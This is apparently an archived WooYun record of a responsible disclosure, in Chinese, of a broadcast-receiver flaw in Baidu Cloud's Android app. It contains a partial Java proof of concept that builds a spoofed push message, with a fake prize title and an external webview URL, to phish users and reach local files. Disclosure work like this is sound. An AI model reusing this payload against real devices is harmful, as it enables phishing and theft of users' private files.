{"id": 7941, "wybug_id": "wooyun-2013-039801", "wybug_title": "百度云盘手机版钓鱼、信息泄露和代码执行高危漏洞三合一", "wybug_corp": "百度", "wybug_author": "Pentest.mobi", "wybug_date": "2013-10-15 14:44", "wybug_open_date": "2013-11-29 14:57", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-29：\t细节向公众公开  简要描述： 百度云盘手机版存在高危漏洞，恶意攻击者通过该漏洞可以对手机用户进行钓鱼欺骗，盗取用户隐私文件和信息，以百度云盘APP权限执行任何代码。 详细说明：  百度云盘有一个广播接收器没有对消息进行安全验证，通过发送恶意的消息，攻击者可以在用户手机通知栏上推送任意消息，点击消息后可以利用webview组件盗取本地隐私文件和执行任意代码。   漏洞证明：  测试版本：官方最新版5.1.0存在漏洞的组件是：com.baidu.android.pushservice.action.MESSAGE漏洞利用关键代码：\nIntent i = new Intent();                i.setAction(\"com.baidu.android.pushservice.action.MESSAGE\");                        Bundle b = new Bundle();                try {         \t        \t        \tJSONObject jsobject = new JSONObject();        \t        \t        \t//1. phishing            JSONObject custom_content_js = new JSONObject();        \t        \tjsobject.put(\"title\", \"百度云盘【漏洞你中奖了！】\");        \tjsobject.put(\"description\", \"\");        \t//jsobject.put(\"url\", \"http://bcscdn.baidu.com/netdisk/BaiduYun_5.1.0.apk\");        \tjsobject.put(\"url\", \"http://drops.wooyun.org/webview.html\");        \t      \t        \tJSONObject customcontent_js = new JSONObject();       \t        \tcustomcontent_js.put(\"type\", \"1\");        \tcustomcontent_js.put(\"msg_type\", \"resources_push\");        \tcustomcontent_js.put(\"uk\", \"1\");        \tcustomcontent_js.put(\"shareId\", \"1\");  \t        \tjsobject.put(\"custom_content\", customcontent_js);   \t        \t        \t        \t\t\t\tString cmd  = jsobject.toString();\t\t\t\t\t\tb.putByteArray(\"message\", cmd.getBytes(\"UTF-8\"));\t\t} catch (Exception e) {\t\t\t// TODO Auto-generated catch block\t\t\te.printStackTrace();\t\t}\n漏洞证明：\n\n\n\n   修复方案：  对恶意消息进行安全验证。   版权声明：转载请注明来源 Pentest.mobi@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-10-15 17:57 厂商回复： 感谢反馈，帮助百度云发现此问题，经验证，此问题无法远程利用，需要手机被安装恶意应用才可利用，百度云团队已启动修复工作，会尽快推出新版本，欢迎继续关注百度云。--“百度，以你更安全” 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-15 15:01 |    \t\t天际 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        | 我只是在打酱油)\t\t \n  百度云真是个神奇的东西···    \n     2013-10-15 15:44 |    \t\tEnjoy_Hacking \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:8        | 时间无言，如此这般。)\t\t \n  我是来看代码执行的    \n     2013-10-15 20:08 |    \t\txxw \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:18        | 中国梦)\t\t \n  靠互联网吃饭的大公司反应就是快。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}